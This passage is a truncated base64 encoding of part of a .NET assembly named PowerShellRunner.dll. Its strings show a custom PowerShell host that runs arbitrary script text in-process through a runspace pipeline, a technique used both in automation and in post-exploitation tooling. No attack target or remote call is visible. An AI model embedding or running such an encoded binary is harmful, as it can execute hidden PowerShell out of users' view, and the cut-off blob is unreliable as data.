ABTAAAAAGAAAEgDAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAwAAAAATgAAHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAlC8AAAAgAAAAMAAAAAIAAAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAEgDAAAAYAAAAAQAAAAyAAAAAAAAAAAAAAAAAABAAABALnJlbG9jAAAMAAAAAIAAAAACAAAANgAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAABwTwAAAAAAAEgAAAACAAUAQCYAAMAnAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAwCtAAAAAQAAEQBzDgAABgooEAAACgsHFG8RAAAKAAYHKBIAAAoMAAhvEwAACgAIbxQAAAoNAAlvFQAACgJvFgAACgAJbxUAAAoWbxcAAAoYF28YAAAKAAlvFQAACnIBAABwbxkAAAoACW8aAAAKJgDeEgkU/gETBhEGLQcJbxsAAAoA3AAA3hIIFP4BEwYRBi0HCG8bAAAKANwABm8cAAAKdAQAAAJvGgAABhMEEQQTBSsAEQUqAAAAARwAAAIALAA9aQASAAAAAAIAHQBifwASAAAAAB4CKB0AAAoqEzABAAwAAAACAAARAAJ7AQAABAorAAYqEzABAAsAAAADAAARAHIZAABwCisABioAEzACAA0AAAAEAAARABcWcx4AAAoKKwAGKgAAABMwAQAMAAAABQAAEQACewIAAAQKKwAGKhMwAQAQAAAABgAAEQAoHwAACm8gAAAKCisABioTMAEAEAAAAAYAABEAKB8AAApvIQAACgorAAYqMgByMwAAcHMiAAAKejIAcqwBAHBzIgAACnoSACsAKhIAKwAqEgArACp6AigjAAAKfQEAAAQCcw8AAAZ9AgAABAIoJAAACgAqggJzOwAABn0EAAAEAiglAAAKAAACcyYAAAp9AwAABAAqPgACewMAAAQFbycAAAomKk4AAnsDAAAEciMDAHBvJwAACiYqZgACewMAAAQFciMDAHAoKAAACm8nAAAKJio+AAJ7AwAABANvJwAACiYqZgACewMAAARyJwMAcAMoKAAACm8pAAAKJipmAAJ7AwAABHI3AwBwAygoAAAKbykAAAomKj4AAnsDAAAEA28pAAAKJipmAAJ7AwAABHJHAwBwAygoAAAKbykAAAomKmYAAnsDAAAEclsDAHADKCgAAApvKQAACiYqEgArACoTMAEAEQAAAAMAABEAAnsDAAAEbyoAAAoKKwAGKjIAcm8DAHBzIgAACnoyAHLSBABwcyIAAAp6MgByRwYAcHMiAAAKejIAcsYHAHBzIgAACnoAAAATMAEADAAAAAcAABEAAnsEAAAECisABioyAHJFCQBwcyIAAAp6MgByrAoAcHMiAAAKegAAEzABAAwAAAAIAAARAAJ7CQAABAorAAYqJgACA30JAAAEKgAAEzABAAwAAAAJAAARAAJ7DAAABAorAAYqJgACA30MAAAEKgAAEzABAAwAAAAKAAARAAJ7BgAABAorAAYqJgACA30GAAAEKgAAEzABAAwAAAALAAARAAJ7BwAABAorAAYqJgACA30HAAAEKjIAci8MAHBzIgAACnoAEzABAAwAAAAIAAARAAJ7CAAABAorAAYqJgACA30IAAAEKjIAcnkMAHBzIgAACnoyAHLFDABwcyIAAAp6EzABAAwAAAAJAAARAAJ7CgAABAorAAYqEzABAAwAAAAJAAARAAJ7CwAABAorAAYqMgByBw0AcHMiAAAKejIAcmwOAHBzIgAACnoyAHK8DgBwcyIAAAp6MgByCA8AcHMiAAAKehMwAQAMAAAACgAAEQACew0AAAQKKwAGKiYAAgN9DQAABCoAABMwAQAMAAAACQAAEQACewUAAAQKKwAGKiYAAgN9BQAABCoAABMwAQAMAAAAAwAAEQACew4AAAQKKwAGKiYAAgN9DgAABCoAABMwAwACAQAADAAAEQISAP4VFAAAARIAH3goKwAACgASAB9kKCwAAAoABn0FAAAEAhIB/hUVAAABEgEWKC0AAAoAEgEWKC4AAAoAB30GAAAEAhd9BwAABAIfD30IAAAEAhZ9CQAABAISAv4VFAAAARICIP///38oKwAACgASAiD///9/KCwAAAoACH0KAAAEAhID/hUUAAABEgMfZCgrAAAKABIDH2QoLAAACgAJfQsAAAQCEgT+FRQAAAESBB9kKCsAAAoAEgQg6AMAACgsAAAKABEEfQwAAAQCE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EN1c3RvbVBTUkhvc3RSYXdVc2VySW50ZXJmYWNlAG1zY29ybGliAFN5c3RlbQBPYmplY3QAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkhvc3QAUFNIb3N0AFBTSG9zdFVzZXJJbnRlcmZhY2UAUFNIb3N0UmF3VXNlckludGVyZmFjZQBJbnZva2VQUwAuY3RvcgBHdWlkAF9ob3N0SWQAX3VpAGdldF9JbnN0YW5jZUlkAGdldF9OYW1lAFZlcnNpb24AZ2V0X1ZlcnNpb24AZ2V0X1VJAFN5c3RlbS5HbG9iYWxpemF0aW9uAEN1bHR1cmVJbmZvAGdldF9DdXJyZW50Q3VsdHVyZQBnZXRfQ3VycmVudFVJQ3VsdHVyZQBFbnRlck5lc3RlZFByb21wdABFeGl0TmVzdGVkUHJvbXB0AE5vdGlmeUJlZ2luQXBwbGljYXRpb24ATm90aWZ5RW5kQXBwbGljYXRpb24AU2V0U2hvdWxkRXhpdABJbnN0YW5jZUlkAE5hbWUAVUkAQ3VycmVudEN1bHR1cmUAQ3VycmVudFVJQ3VsdHVyZQBTeXN0ZW0uVGV4dABTdHJpbmdCdWlsZGVyAF9zYgBfcmF3VWkAQ29uc29sZUNvbG9yAFdyaXRlAFdyaXRlTGluZQBXcml0ZURlYnVnTGluZQBXcml0ZUVycm9yTGluZQBXcml0ZVZlcmJvc2VMaW5lAFdyaXRlV2FybmluZ0xpbmUAUHJvZ3Jlc3NSZWNvcmQAV3JpdGVQcm9ncmVzcwBnZXRfT3V0cHV0AFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljAERpY3Rpb25hcnlgMgBQU09iamVjdABTeXN0ZW0uQ29sbGVjdGlvbnMuT2JqZWN0TW9kZWwAQ29sbGVjdGlvbmAxAEZpZWxkRGVzY3JpcHRpb24AUHJvbXB0AENob2ljZURlc2NyaXB0aW9uAFByb21wdEZvckNob2ljZQBQU0NyZWRlbnRpYWwAUFNDcmVkZW50aWFsVHlwZXMAUFNDcmVkZW50aWFsVUlPcHRpb25zAFByb21wdEZvckNyZWRlbnRpYWwAZ2V0X1Jhd1VJAFJlYWRMaW5lAFN5c3RlbS5TZWN1cml0eQBTZWN1cmVTdHJpbmcAUmVhZExpbmVBc1NlY3VyZVN0cmluZwBPdXRwdXQAUmF3VUkAU2l6ZQBfd2luZG93U2l6ZQBDb29yZGluYXRlcwBfY3Vyc29yUG9zaXRpb24AX2N1cnNvclNpemUAX2ZvcmVncm91bmRDb2xvcgBfYmFja2dyb3VuZENvbG9yAF9tYXhQaHlzaWNhbFdpbmRvd1NpemUAX21heFdpbmRvd1NpemUAX2J1ZmZlclNpemUAX3dpbmRvd1Bvc2l0aW9uAF93aW5kb3dUaXRsZQBnZXRfQmFja2dyb3VuZENvbG9yAHNldF9CYWNrZ3JvdW5kQ29sb3IAZ2V0X0J1ZmZlclNpemUAc2V0X0J1ZmZlclNpemUAZ2V0X0N1cnNvclBvc2l0aW9uAHNldF9DdXJzb3JQb3NpdGlvbgBnZXRfQ3Vyc29yU2l6ZQBzZXRfQ3Vyc29yU2l6ZQBGbHVzaElucHV0QnVmZmVyAGdldF9Gb3JlZ3JvdW5kQ29sb3IAc2V0X0ZvcmVncm91bmRDb2xvcgBCdWZmZXJDZWxsAFJlY3RhbmdsZQBHZXRCdWZmZXJDb250ZW50cwBnZXRfS2V5QXZhaWxhYmxlAGdldF9NYXhQaHlzaWNhbFdpbmRvd1NpemUAZ2V0X01heFdpbmRvd1NpemUAS2V5SW5mbwBSZWFkS2V5T3B0aW9ucwBSZWFkS2V5AFNjcm9sbEJ1ZmZlckNvbnRlbnRzAFNldEJ1ZmZlckNvbnRlbnRzAGdldF9XaW5kb3dQb3NpdGlvbgBzZXRfV2luZG93UG9zaXRpb24AZ2V0X1dpbmRvd1NpemUAc2V0X1dpbmRvd1NpemUAZ2V0X1dpbmRvd1RpdGxlAHNldF9XaW5kb3dUaXRsZQBCYWNrZ3JvdW5kQ29sb3IAQnVmZmVyU2l6ZQBDdXJzb3JQb3NpdGlvbgBDdXJzb3JTaXplAEZvcmVncm91bmRDb2xvcgBLZXlBdmFpbGFibGUATWF4UGh5c2ljYWxXaW5kb3dTaXplAE1heFdpbmRvd1NpemUAV2luZG93UG9zaXRpb24AV2luZG93U2l6ZQBXaW5kb3dUaXRsZQBjb21tYW5kAGV4aXRDb2RlAGZvcmVncm91bmRDb2xvcgBiYWNrZ3JvdW5kQ29sb3IAdmFsdWUAbWVzc2FnZQBzb3VyY2VJZAByZWNvcmQAY2FwdGlvbgBkZXNjcmlwdGlvbnMAY2hvaWNlcwBkZWZhdWx0Q2hvaWNlAHVzZXJOYW1lAHRhcmdldE5hbWUAYWxsb3dlZENyZWRlbnRpYWxUeXBlcwBvcHRpb25zAHJlY3RhbmdsZQBzb3VyY2UAZGVzdGluYXRpb24AY2xpcABmaWxsAG9yaWdpbgBjb250ZW50cwBTeXN0ZW0uUmVmbGVjdGlvbgBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAQXNzZW1ibHlDdWx0dXJlQXR0cmlidXRlAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBDb21WaXNpYmxlQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUAQXNzZW1ibHlWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAU3lzdGVtLkRpYWdub3N0aWNzAERlYnVnZ2FibGVBdHRyaWJ1dGUARGVidWdnaW5nTW9kZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBDb21waWxhdGlvblJlbGF4YXRpb25zQXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAEluaXRpYWxTZXNzaW9uU3RhdGUAQ3JlYXRlRGVmYXVsdABBdXRob3JpemF0aW9uTWFuYWdlcgBzZXRfQXV0aG9yaXphdGlvbk1hbmFnZXIAUnVuc3BhY2VGYWN0b3J5AFJ1bnNwYWNlAENyZWF0ZVJ1bnNwYWNlAE9wZW4AUGlwZWxpbmUAQ3JlYXRlUGlwZWxpbmUAQ29tbWFuZENvbGxlY3Rpb24AZ2V0X0NvbW1hbmRzAEFkZFNjcmlwdABDb21tYW5kAGdldF9JdGVtAFBpcGVsaW5lUmVzdWx0VHlwZXMATWVyZ2VNeVJlc3VsdHMAQWRkAEludm9rZQBJRGlzcG9zYWJsZQBEaXNwb3NlAFN5c3RlbS5UaHJlYWRpbmcAVGhyZWFkAGdldF9DdXJyZW50VGhyZWFkAE5vdEltcGxlbWVudGVkRXhjZXB0aW9uAE5ld0d1aWQAQXBwZW5kAFN0cmluZwBDb25jYXQAQXBwZW5kTGluZQBUb1N0cmluZwBzZXRfV2lkdGgAc2V0X0hlaWdodABzZXRfWABzZXRfWQAAABdvAHUAdAAtAGQAZQBmAGEAdQBsAHQAARlDAHUAcwB0AG8AbQBQAFMASABvAHMAdAAAgXdFAG4AdABlAHIATgBlAHMAdABlAGQAUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBdUUAeABpAHQATgBlAHMAdABlAGQAUAByAG8AbQBwAHQAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAEDCgAAD0QARQBCAFUARwA6ACAAAA9FAFIAUgBPAFIAOgAgAAATVgBFAFIAQgBPAFMARQA6ACAAABNXAEEAUgBOAEkATgBHADoAIAAAgWFQAHIAbwBtAHAAdAAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYFzUAByAG8AbQBwAHQARgBvAHIAQwBoAG8AaQBjAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBfVAAcgBvAG0AcAB0AEYAbwByAEMAcgBlAGQAZQBuAHQAaQBhAGwAMQAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AIAAgAFQAaABlACAAcwBjAHIAaQBwAHQAIABpAHMAIABhAHMAawBpAG4AZwAgAGYAbwByACAAaQBuAHAAdQB0ACwAIAB3AGgAaQBjAGgAIABpAHMAIABhACAAcAByAG8AYgBsAGUAbQAgAHMAaQBuAGMAZQAgAHQAaABlAHIAZQAnAHMAIABuAG8AIABjAG8AbgBzAG8AbABlAC4AIAAgAE0AYQBrAGUAIABzAHUAcgBlACAAdABoAGUAIABzAGMAcgBpAHAAdAAgAGMAYQBuACAAZQB4AGUAYwB1AHQAZQAgAHcAaQB0AGgAbwB1AHQAIABwAHIAbwBtAHAAdABpAG4AZwAgAHQAaABlACAAdQBzAGUAcgAgAGYAbwByACAAaQBuAHAAdQB0AC4AAYF9UAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAyACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQALgAgACAAVABoAGUAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGEAcwBrAGkAbgBnACAAZgBvAHIAIABpAG4AcAB1AHQALAAgAHcAaABpAGMAaAAgAGkAcwAgAGEAIABwAHIAbwBiAGwAZQBtACAAcwBpAG4AYwBlACAAdABoAGUAcgBlACcAcwAgAG4AbwAgAGMAbwBuAHMAbwBsAGUALgAgACAATQBhAGsAZQAgAHMAdQByAGUAIAB0AGgAZQAgAHMAYwByAGkAcAB0ACAAYwBhAG4AIABlAHgAZQBjAHUAdABlACAAdwBpAHQAaABvAHUAdAAgAHAAcgBvAG0AcAB0AGkAbgBnACAAdABoAGUAIAB1AHMAZQByACAAZgBvAHIAIABpAG4AcAB1AHQALgABgWVSAGUAYQBkAEwAaQBuAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAGBgVIAZQBhAGQATABpAG4AZQBBAHMAUwBlAGMAdQByAGUAUwB0AHIAaQBuAGcAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAFJRgBsAHUAcwBoAEkAbgBwAHUAdABCAHUAZgBmAGUAcgAgAGkAcwAgAG4AbwB0ACAAaQBtAHAAbABlAG0AZQBuAHQAZQBkAC4AAEtHAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABBSwBlAHkAQQB2AGEAaQBsAGEAYgBsAGUAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAACBY1IAZQBhAGQASwBlAHkAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuACAAIABUAGgAZQAgAHMAYwByAGkAcAB0ACAAaQBzACAAYQBzAGsAaQBuAGcAIABmAG8AcgAgAGkAbgBwAHUAdAAsACAAdwBoAGkAYwBoACAAaQBzACAAYQAgAHAAcgBvAGIAbABlAG0AIABzAGkAbgBjAGUAIAB0AGgAZQByAGUAJwBzACAAbgBvACAAYwBvAG4AcwBvAGwAZQAuACAAIABNAGEAawBlACAAcwB1AHIAZQAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABjAGEAbgAgAGUAeABlAGMAdQB0AGUAIAB3AGkAdABoAG8AdQB0ACAAcAByAG8AbQBwAHQAaQBuAGcAIAB0AGgAZQAgAHUAcwBlAHIAIABmAG8AcgAgAGkAbgBwAHUAdAAuAAFPUwBjAHIAbwBsAGwAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQAAEtTAGUAdABCAHUAZgBmAGUAcgBDAG8AbgB0AGUAbgB0AHMAIABpAHMAIABuAG8AdAAgAGkAbQBwAGwAZQBtAGUAbgB0AGUAZAAuAABJUwBlAHQAQgB1AGYAZgBlAHIAQwBvAG4AdABlAG4AdABzACAAaQBzACAAbgBvAHQAIABpAG0AcABsAGUAbQBlAG4AdABlAGQAAAEAzG5bdTXxDkGpWvD9BDhKxAAIt3pcVhk04IkIMb84Vq02TjUEAAEODgMgAAEDBhEVAwYSEAQgABEVAyAADgQgABIZBCAAEg0EIAASHQQgAQEIBCgAERUDKAAOBCgAEhkEKAASDQQoABIdAwYSIQMGEhQIIAMBESURJQ4EIAEBDgYgAgEKEikRIAMVEi0CDhIxDg4VEjUBEjkMIAQIDg4VEjUBEj0IDCAGEkEODg4OEUURSQggBBJBDg4ODgQgABIRBCAAEk0EKAASEQMGEVEDBhFVAgYIAwYRJQIGDgQgABElBSABARElBCAAEVEFIAEBEVEEIAARVQUgAQERVQMgAAgMIAEUEVkCAAIAABFdAyAAAgYgARFhEWULIAQBEV0RVRFdEVkHIAIBEV0RWQ0gAgERVRQRWQIAAgAABCgAESUEKAARUQQoABFVAygACAMoAAIEIAEBAgYgAQERgJ0FAAASgKkGIAEBEoCtCgACEoC1EgkSgKkFIAASgLkFIAASgL0HFRI1ARKAwQUgARMACAkgAgERgMURgMUIIAAVEjUBEjEQBwcSDBKAqRKAtRKAuQ4OAgQHAREVAwcBDgUgAgEICAQHARIZBAcBEg0FAAASgM0EBwESHQQAABEVBSABEiEOBQACDg4OBAcBEhEEBwERJQQHARFRBAcBEVUDBwEIDgcGEVERVRFREVERURFVFQEAEFBvd2VyU2hlbGxSdW5uZXIAAAUBAAAAABcBABJDb3B5cmlnaHQgwqkg